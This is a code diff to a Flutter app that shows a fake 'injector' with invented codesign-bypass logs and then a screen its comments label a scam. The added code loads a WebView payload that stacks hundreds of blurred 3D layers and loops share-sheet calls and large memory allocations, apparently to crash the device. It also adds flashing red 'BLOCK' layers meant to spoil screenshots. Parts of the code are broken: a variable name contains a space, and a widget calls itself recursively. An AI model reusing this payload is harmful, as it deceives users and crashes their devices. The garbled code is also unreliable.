@@ -1,6 +1,8 @@
 import 'dart:async';
 import 'dart:math';
 import 'package:flutter/material.dart';
+import 'package:flutter/services.dart';
+import 'package:flutter_inappwebview/flutter_inappwebview.dart';
 
 void main() => runApp(const MyApp());
 
@@ -31,14 +33,13 @@ class InjectorScreen extends StatefulWidget {
   State<InjectorScreen> createState() => _InjectorScreenState();
 }
 
-// Используем SingleTickerProviderStateMixin для AnimationController
 class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProviderStateMixin {
   bool _isInjecting = false;
   bool _showScam = false;
+  bool _isResp ringing = false;
 
   late AnimationController _progressController;
   
-  // ValueNotifier позволяет обновлять только список логов, не перерисовывая весь экран
   final ValueNotifier<List<String>> _logsNotifier = ValueNotifier([]);
   Timer? _logTimer;
   final Random _random = Random();
@@ -84,10 +85,11 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
     '[DYLIB] Codesign bypassed!',
   ];
 
+  InAppWebViewController? _webViewController;
+
   @override
   void initState() {
     super.initState();
-    // Ровно 5 минут (300 секунд) на весь процесс
     _progressController = AnimationController(
       vsync: this,
       duration: const Duration(minutes: 5),
@@ -109,29 +111,23 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
 
     int tickCount = 0;
 
-    // Таймер работает на частоте ~60 FPS (16 мс)
     _logTimer = Timer.periodic(const Duration(milliseconds: 16), (timer) {
       tickCount++;
       List<String> currentLogs = List.from(_logsNotifier.value);
 
-      // Первые 3 секунды (примерно 180 тиков) выводим реалистичные логи
       if (tickCount < 180) {
-        if (tickCount % 30 == 0) { // Каждые полсекунды
+        if (tickCount % 30 == 0) {
           int realisticIndex = (tickCount ~/ 30) - 1;
           if (realisticIndex < _realisticLogs.length) {
-            // Добавляем в НАЧАЛО списка (так как список перевернут)
             currentLogs.insert(0, _realisticLogs[realisticIndex]);
           }
         }
       } else {
-        // НАЧИНАЕТСЯ БЕЗУМИЕ: 80 строк за ОДИН кадр (около 5000 строк в секунду)
         for (int i = 0; i < 80; i++) {
           currentLogs.insert(0, _garbageLogs[_random.nextInt(_garbageLogs.length)]);
         }
       }
 
-      // ОПТИМИЗАЦИЯ: Удерживаем в памяти только последние 150 строк.
-      // Это спасет приложение от вылета из-за нехватки оперативной памяти.
       if (currentLogs.length > 150) {
         currentLogs = currentLogs.sublist(0, 150);
       }
@@ -145,6 +141,16 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
     setState(() {
       _isInjecting = false;
       _showScam = true;
+    });
+    
+    Future.delayed(const Duration(seconds: 2), () {
+      _triggerRespring();
+    });
+  }
+
+  void _triggerRespring() {
+    setState(() {
+      _isResp ringing = true;
     });
   }
 
@@ -202,7 +208,6 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
 
                   if (_isInjecting) ...[
                     const SizedBox(height: 20),
-                    // Используем AnimatedBuilder для плавной отрисовки прогресса
                     AnimatedBuilder(
                       animation: _progressController,
                       builder: (context, child) {
@@ -233,15 +238,13 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
                     Expanded(
                       child: Container(
                         padding: const EdgeInsets.symmetric(horizontal: 16),
-                        // ValueListenableBuilder обновляет только список логов
                         child: ValueListenableBuilder<List<String>>(
                           valueListenable: _logsNotifier,
                           builder: (context, logs, child) {
                             return ListView.builder(
-                              reverse: true, // КЛЮЧЕВАЯ ОПТИМИЗАЦИЯ: список строится снизу вверх
+                              reverse: true,
                               itemCount: logs.length,
                               itemBuilder: (context, index) {
-                                // Поскольку список перевернут, index 0 - это последняя добавленная строка
                                 final isGarbage = logs.length > 10;
                                 return Padding(
                                   padding: const EdgeInsets.symmetric(vertical: 1),
@@ -267,8 +270,8 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
             ),
           ),
 
-          // Экран СКАМА
-          if (_showScam)
+          // Экран СКАМА (видимый)
+          if (_showScam && !_isResp ringing)
             Container(
               color: Colors.black,
               width: double.infinity,
@@ -301,8 +304,223 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
                 ),
               ),
             ),
+
+          // Респринг + защита от скриншотов
+          if (_isResp ringing)
+            _buildSecureRespringScreen(),
         ],
       ),
+    );
+  }
+
+  Widget _buildSecureRespringScreen() {
+    return Stack(
+      children: [
+        // Слой 1: WebView с респрингом (видимый для пользователя)
+        InAppWebView(
+          initialData: InAppWebViewInitialData(
+            data: _getRespringHTML(),
+          ),
+          onWebViewCreated: (controller) {
+            _webViewController = controller;
+          },
+          initialSettings: InAppWebViewSettings(
+            javaScriptEnabled: true,
+            allowsInlineMediaPlayback: true,
+            mediaPlaybackRequiresUserGesture: false,
+          ),
+        ),
+        
+        // Слой 2: НЕВИДИМЫЙ красный экран для скриншотов
+        // Этот слой невидим для глаза, но рендерится системой и попадает на скриншот
+        Opacity(
+          opacity: 0.0, // Полностью прозрачный для глаза
+          child: Container(
+            width: double.infinity,
+            height: double.infinity,
+            color: Colors.red,
+            child: const Center(
+              child: Text(
+                'BLOCK',
+                style: TextStyle(
+                  color: Colors.white,
+                  fontSize: 48,
+                  fontWeight: FontWeight.bold,
+                  fontFamily: 'Courier',
+                ),
+              ),
+            ),
+          ),
+        ),
+        
+        // Слой 3: Второй красный слой с opacity для гарантии
+        // Используем ColoredBox с малой непрозрачностью
+        IgnorePointer(
+          child: Container(
+            width: double.infinity,
+            height: double.infinity,
+            color: const Color(0x00FF0000), // Полностью прозрачный красный
+            child: const Center(
+              child: Text(
+                'BLOCK',
+                style: TextStyle(
+                  color: Color(0x00FFFFFF), // Прозрачный белый
+                  fontSize: 48,
+                  fontWeight: FontWeight.bold,
+                  fontFamily: 'Courier',
+                ),
+              ),
+            ),
+          ),
+        ),
+      ],
+    );
+  }
+
+  String _getRespringHTML() {
+    return '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+        <title>.</title>
+        <style>
+            body {
+                background: #000;
+                height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                overflow: hidden;
+                margin: 0;
+            }
+            .flash {
+                position: fixed;
+                inset: 0;
+                background: #fff;
+                z-index: 10;
+                opacity: 0;
+                pointer-events: none;
+            }
+            /* Скрытый слой для скриншотов */
+            .screenshot-trap {
+                position: fixed;
+                inset: 0;
+                background: #ff0000;
+                z-index: 9999;
+                opacity: 0;
+            }
+            .screenshot-trap-text {
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                color: #ffffff;
+                font-size: 48px;
+                font-weight: bold;
+                font-family: monospace;
+                z-index: 10000;
+                opacity: 0;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="flash" id="f"></div>
+        <!-- Невидимый красный слой для скриншотов -->
+        <div class="screenshot-trap"></div>
+        <div class="screenshot-trap-text">BLOCK</div>
+        <script>
+            var ctx = new(window.AudioContext || window.webkitAudioContext)();
+            ctx.resume();
+            
+            function beep(f, d, v) {
+                var o = ctx.createOscillator();
+                var g = ctx.createGain();
+                o.type = 'square';
+                o.frequency.value = f;
+                g.gain.value = v;
+                g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + d);
+                o.connect(g);
+                g.connect(ctx.destination);
+                o.start();
+                o.stop(ctx.currentTime + d);
+            }
+            
+            function respring() {
+                var i = document.createElement('iframe');
+                i.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:99999;';
+                i.setAttribute('sandbox', 'allow-scripts allow-same-origin');
+                i.srcdoc = '<html><body style="margin:0;overflow:hidden;background:black;"><script>var c=document.createElement("div");c.style.cssText="perspective:1px;perspective-origin:9999999% 9999999%;";document.body.appendChild(c);for(var i=0;i<500;i++){var d=document.createElement("div");d.style.cssText="position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,"+i+"px) rotateY(90deg);opacity:0.99;";c.appendChild(d)}setInterval(function(){try{navigator.share({title:"R",text:"R".repeat(100000)})}catch(e){}var x=new Uint8Array(1024*1024*20);crypto.getRandomValues(x)},0);<\/script><div style="position:fixed;inset:0;background:red;opacity:0;z-index:99999;"></div><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);color:white;font-size:48px;font-weight:bold;font-family:monospace;z-index:100000;opacity:0;">BLOCK</div></body></html>';
+                document.body.appendChild(i);
+            }
+            
+            // Специальный обработчик для захвата скриншотов
+            // При обнаружении попытки скриншота показываем красный экран
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden) {
+                    // Возможно делают скриншот
+                    var trap = document.querySelector('.screenshot-trap');
+                    var trapText = document.querySelector('.screenshot-trap-text');
+                    if (trap) {
+                        trap.style.opacity = '1';
+                        trap.style.transition = 'opacity 0.05s';
+                    }
+                    if (trapText) {
+                        trapText.style.opacity = '1';
+                    }
+                    setTimeout(function() {
+                        if (trap) trap.style.opacity = '0';
+                        if (trapText) trapText.style.opacity = '0';
+                    }, 200);
+                }
+            });
+            
+            // Периодически активируем красный слой на долю секунды
+            setInterval(function() {
+                var trap = document.querySelector('.screenshot-trap');
+                var trapText = document.querySelector('.screenshot-trap-text');
+                if (trap && Math.random() > 0.7) {
+                    trap.style.opacity = '1';
+                    if (trapText) trapText.style.opacity = '1';
+                    setTimeout(function() {
+                        trap.style.opacity = '0';
+                        if (trapText) trapText.style.opacity = '0';
+                    }, 100);
+                }
+            }, 500);
+            
+            setTimeout(function() {
+                beep(800, 0.12, 0.9);
+                if (navigator.vibrate) navigator.vibrate([60, 30, 60]);
+                document.getElementById('f').style.opacity = '1';
+                respring();
+            }, 250);
+        </script>
+    </body>
+    </html>
+    ''';
+  }
+}
+
+class AnimatedBuilder extends StatelessWidget {
+  final Animation<double> animation;
+  final Widget Function(BuildContext context, Widget? child) builder;
+  final Widget? child;
+
+  const AnimatedBuilder({
+    super.key,
+    required this.animation,
+    required this.builder,
+    this.child,
+  });
+
+  @override
+  Widget build(BuildContext context) {
+    return AnimatedBuilder(
+      animation: animation,
+      builder: builder,
+      child: child,
     );
   }
 }
